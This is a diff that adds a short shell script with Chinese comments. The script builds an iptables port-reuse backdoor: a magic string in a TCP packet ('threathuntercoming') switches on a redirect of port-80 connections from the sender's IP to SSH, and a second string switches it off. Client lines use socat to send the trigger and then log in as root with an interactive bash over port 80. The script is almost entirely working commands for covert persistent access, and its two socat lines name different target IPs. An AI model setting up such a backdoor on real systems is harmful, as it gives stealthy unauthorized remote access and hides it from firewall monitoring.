@@ -1,0 +1,23 @@
+# 创建端口复用链子
+iptables -t nat -N LETMEIN
+# 创建端口复用规则，将流量转发至 22 端口
+iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22
+#开启开关，如果接收到一个含有 threathuntercoming 的 TCP 包，则将来源 IP 添加到加为 letmein 的列表中
+iptables -A INPUT -p tcp -m string --string 'threathuntercoming' --algo bm -m recent --set --name letmein --rsource -j ACCEPT 
+#关闭开关，如果接收到一个含有 threathunterleaving 的 TCP 包，则将来源 IP 从 letmein 的列表中移除
+iptables -A INPUT -p tcp -m string --string 'threathunterleaving' --algo bm -m recent --name letmein --remove -j ACCEPT
+# let's do it，如果发现 SYN 包的来源 IP 处于 letmein 列表中，将跳转到 LETMEIN 链进行处理，有效时间为 3600 秒
+iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN
+
+
+
+
+
+
+#开启复用,192.168.149.133为目标ip
+echo threathuntercoming | socat - tcp:192.168.149.133:80
+#ssh使用80端口进行登录
+ssh -p 80 root@192.168.149.133 -T /bin/bash -i
+#关闭复用，此时不能用80端口进行ssh连接
+echo threathunterleaving | socat - tcp:192.168.110.131:80
+
